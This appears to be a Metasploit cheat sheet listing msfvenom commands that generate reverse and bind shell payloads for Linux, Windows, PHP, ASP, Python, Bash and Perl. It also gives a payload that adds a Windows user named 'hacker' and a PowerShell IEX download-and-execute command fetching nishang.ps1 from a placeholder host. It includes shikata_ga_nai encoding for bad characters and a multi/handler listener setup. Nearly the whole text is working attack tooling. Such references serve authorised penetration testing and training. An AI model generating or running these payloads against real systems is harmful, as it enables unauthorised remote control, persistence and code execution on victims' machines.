# Metasploit

## MSFVenom shells:

### Linux

Linux Meterpreter reverse shell x86 multi stage:

```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Linux Meterpreter bind shell x86 multi stage:

```sh
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Linux bind shell x64 single stage:

```sh
msfvenom -p linux/x64/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Linux reverse shell x64 single stage:

```sh
msfvenom -p linux/x64/shell_reverse_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

### Windows

Windows Meterpreter http reverse shell:

```sh
msfvenom -p windows/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
```

Windows Meterpreter bind shell:

```sh
msfvenom -p windows/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

Windows CMD Multi Stage:

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

Windows CMD Single Stage:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

Windows add user:

```sh
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```

Windows shell which doesn't break the application for a x86 architecture:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f exe -a x86 --platform windows -o sploit.exe
```


Windows Exec Nishang Powershell in python

```sh
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f python
```

Bad characters shikata_ga_nai:

```sh
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<IP> LPORT=<PORT> -f c -e x86/shikata_ga_nai -b "\x04\xA0"
```

Bad characters fnstenv_mov:

```sh
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<IP> LPORT=<PORT> -f c -e x86/fnstenv_mov -b "\x04\xA0"
```

### Misc

Python Shell:

```sh
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
```

Bash Shell:

```sh
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
```

Perl Shell:

```sh
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
```

ASP Meterpreter Shell:

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

PHP Reverse Shell:

```sh
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > phpreverseshell.php
```

To get multiple session on a single multi/handler, you need to set the
ExitOnSession option to false and run the exploit -j instead of just the
exploit. For example, for meterpreter/reverse_tcp payload:

```
msf>use exploit/multi/handler
msf>set payload windows/meterpreter/reverse_tcp
msf>set lhost <IP>
msf>set lport <PORT>
msf> set ExitOnSession false
msf>exploit -j
```
